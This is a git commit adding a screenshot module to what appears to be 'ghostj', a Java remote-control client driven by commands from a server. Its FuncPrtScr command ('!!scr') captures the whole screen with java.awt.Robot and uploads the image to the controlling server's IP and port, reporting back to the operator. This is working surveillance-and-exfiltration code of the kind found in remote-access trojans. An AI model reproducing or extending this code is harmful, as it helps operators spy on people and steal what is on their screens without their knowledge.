4587362378bb897977921c836e7a1ea3ca123dfb
Rock Chin <1010553892@qq.com>
2020-09-06 20:37:39 +0800

    FuncPrtScr

---
+++ src/com/ghostj/client/func/FuncPrtScr.java
@@ -0,0 +1,67 @@
+package com.ghostj.client.func;
+
+import com.ghostj.client.cmd.AbstractFunc;
+import com.ghostj.client.cmd.AbstractProcessor;
+import com.ghostj.client.conn.HandleConn;
+import com.ghostj.client.core.ClientMain;
+import com.ghostj.client.util.PrtScreen;
+import com.rft.core.client.FileSender;
+
+import java.io.File;
+import java.util.Date;
+
+import static com.ghostj.client.conn.HandleConn.writeToServer;
+
+public class FuncPrtScr implements AbstractFunc {
+	@Override
+	public String getFuncName() {
+		return "!!scr";
+	}
+
+	@Override
+	public String[] getParamsModel() {
+		return new String[]{"[picFile]"};
+	}
+
+	@Override
+	public String getDescription() {
+		return "截图，可选择保存到的文件";
+	}
+
+	@Override
+	public int getMinParamsAmount() {
+		return 0;
+	}
+
+	@Override
+	public void run(String[] params, String cmd, AbstractProcessor processor) {
+
+		String param="scr.png";
+		if(params.length>=1)
+			param=params[0];
+		else
+			param="scr.png";
+		try {
+			String finalParam = param;
+			Thread t=new Thread(() -> {
+				try {
+					writeToServer("正在创建屏幕截图\n");
+					PrtScreen.saveScreen(finalParam);
+					writeToServer("成功将截图保存到 " + finalParam + "\n");
+				} catch (Exception e) {
+					writeToServer("获取屏幕截图失败:" + ClientMain.getErrorInfo(e)+"\n");
+				}
+				try {
+					//发送到服务器
+					FileSender.sendFile(new File(finalParam), "prtscr/"+ ClientMain.name, "prtscr" + new Date().getTime(), HandleConn.ip, HandleConn.rft_port);
+				}catch (Exception e){
+					writeToServer("无法将截图上传至服务器"+"\n");
+				}
+			});
+			t.start();
+		}catch (Exception e){
+			writeToServer("获取屏幕截图失败:" + ClientMain.getErrorInfo(e)+"\n");
+		}
+		HandleConn.sendFinishToServer();
+	}
+}
---
+++ src/com/ghostj/client/util/PrtScreen.java
@@ -0,0 +1,31 @@
+package com.ghostj.client.util;
+
+import javax.imageio.ImageIO;
+import java.awt.*;
+import java.awt.image.BufferedImage;
+import java.io.File;
+import java.io.FileOutputStream;
+import java.io.OutputStream;
+
+public class PrtScreen {
+	public static void saveScreen(String file)throws Exception{
+		try {
+
+			// 获取截图的大小
+			Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
+			// java自动化类
+			Robot robot = new Robot();
+			// 创建输出
+			OutputStream out = new FileOutputStream(new File(file));
+
+			// 截图
+			BufferedImage image = robot.createScreenCapture(screenRect);
+
+			// 保存为png
+			ImageIO.write(image, "png", out);
+			out.close();
+		}catch (Exception e){
+			throw e;
+		}
+	}
+}
